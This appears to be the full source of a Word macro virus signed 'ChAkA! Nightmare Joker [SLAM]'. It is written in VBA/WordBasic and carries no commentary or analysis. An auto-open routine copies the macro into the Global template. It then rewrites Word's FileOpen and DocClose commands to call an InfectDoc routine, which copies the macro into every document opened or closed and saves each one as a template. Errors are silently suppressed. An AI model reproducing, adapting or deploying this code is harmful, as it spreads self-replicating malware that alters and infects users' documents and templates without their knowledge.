   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "aUTOoPEN"

   Public Sub MAIN()
   Dim a$
   Dim M1$
   Dim M2$
   Dim i
   Dim IV

   Rem ChAkA! Nightmare Joker [SLAM]

   On Error GoTo -1: On Error GoTo Finish
   a$ = WordBasic.[AppInfo$](16)
   a$ = WordBasic.[Left$](a$, 7)
   If a$ = "Deutsch" Then
       M1$ = "DateiÖffnen"
       M2$ = "DokumentSchließen"
   ElseIf a$ = "English" Then
       M1$ = "FileOpen"
       M2$ = "DocClose"
   End If
   If WordBasic.CountMacros(0) > 0 Then
   For i = 1 To WordBasic.CountMacros(0)
       If WordBasic.[MacroName$](i, 0) = "ChAkA" Then
               IV = 1
       End If
   Next i
   End If
   If IV = 0 Then
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":aUTOoPEN", "Global:ChAkA"
   WordBasic.ScreenUpdating
   WordBasic.ToolsMacro Name:=M1$, Show:=1, Edit:=1
   WordBasic.StartOfDocument
   WordBasic.LineDown 1
   WordBasic.CharRight 10
   WordBasic.Insert Chr(32)
   WordBasic.StartOfDocument
   WordBasic.LineDown 4
   WordBasic.EndOfLine
   WordBasic.InsertPara
   WordBasic.Insert "ChAkA.InfectDoc"
   WordBasic.DocClose 1
   WordBasic.ToolsMacro Name:=M2$, Show:=1, Edit:=1
   WordBasic.StartOfDocument
   WordBasic.EndOfLine
   WordBasic.InsertPara
   WordBasic.Insert "ChAkA.InfectDoc"
   WordBasic.DocClose 1
   WordBasic.FileSaveAll 1, 0
   WordBasic.ScreenUpdating
   End If
   Finish:
   End Sub

   Private Sub InfectDoc()
   Dim i
   Dim ID
   On Error GoTo -1: On Error GoTo Venito
   If WordBasic.CountMacros(1) > 0 Then
   For i = 1 To WordBasic.CountMacros(1)
       If WordBasic.[MacroName$](i, 1) = "aUTOoPEN" Then
               ID = 1
       End If
   Next i
   End If
   If ID = 0 Then
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:ChAkA", WordBasic.[FileName$]() + ":aUTOoPEN"
   WordBasic.FileSaveAll 1, 1
   End If
   End Sub
